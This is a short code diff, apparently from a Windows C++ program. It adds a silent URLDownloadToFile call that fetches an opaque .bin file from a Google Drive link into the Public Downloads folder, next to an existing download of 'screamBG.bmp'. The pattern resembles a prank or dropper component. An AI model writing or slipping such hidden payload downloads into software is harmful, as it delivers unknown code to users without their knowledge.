@@ -20,5 +20,9 @@ int Download() {
     const wchar_t* savepath4 = L"C:\\Users\\Public\\Downloads\\screamBG.bmp";
     URLDownloadToFile(NULL, dwnld_URL4, savepath4, 0, NULL);
 
+    const wchar_t* dwnld_URL5 = L"https://drive.google.com/uc?export=download&id=1bPhFf6TzXgq44SYJk0PS20ve1zfJvakI"; 
+    const wchar_t* savepath5 = L"C:\\Users\\Public\\Downloads\\nane.bin";
+    URLDownloadToFile(NULL, dwnld_URL5, savepath5, 0, NULL);
+
     return 0;
 }
